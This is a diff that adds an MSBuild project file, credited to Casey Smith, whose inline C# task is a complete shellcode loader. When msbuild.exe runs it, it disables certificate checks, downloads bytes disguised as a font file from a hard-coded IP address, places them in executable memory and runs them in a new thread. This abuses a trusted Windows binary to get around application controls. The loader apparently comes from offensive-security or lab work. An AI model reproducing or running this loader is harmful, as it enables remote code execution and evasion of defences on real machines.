@@ -1,0 +1,60 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <!-- This inline task executes shellcode. -->
+    <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+    <!-- Author: Casey Smith, Twitter: @subTee -->
+    <!-- License: BSD 3-Clause -->
+    
+    <Target Name="Hello">
+        <ClassExample />
+    </Target>
+
+    <UsingTask
+        TaskName="ClassExample"
+        TaskFactory="CodeTaskFactory"
+        AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+        <Task>
+            <Code Type="Class" Language="cs">
+            <![CDATA[
+                using System;
+                using System.Runtime.InteropServices;
+                using Microsoft.Build.Framework;
+                using Microsoft.Build.Utilities;
+                using System.Diagnostics;
+                using System.Net;
+
+                public class ClassExample : Task, ITask
+                {
+                private static string url = "http://192.168.45.159:8888/what.woff";
+ 
+  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+ 
+
+                    public override bool Execute()
+                    {
+
+   			
+
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] shellcode = client.DownloadData(url);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+                        return true;
+                    }
+                }
+            ]]>
+            </Code>
+        </Task>
+    </UsingTask>
+</Project>
+
